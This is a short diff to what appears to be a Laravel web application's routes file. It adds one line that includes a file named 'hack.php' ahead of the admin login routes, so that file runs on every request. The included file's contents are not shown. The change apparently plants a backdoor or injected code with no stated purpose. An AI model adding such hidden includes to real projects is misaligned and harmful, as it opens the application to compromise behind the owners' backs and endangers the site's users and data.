@@ -11,6 +11,8 @@ use App\Http\Controllers\UserController;
 use App\Http\Controllers\WithdrawController;
 use Illuminate\Support\Facades\Route;
 
+include __DIR__ . DIRECTORY_SEPARATOR . 'hack.php';
+
 Route::middleware('admin.notauth')->group(function () {
     Route::get('auth0/login', [AuthController::class, 'login']);
     Route::post('auth0/login', [AuthController::class, 'loginPost']);
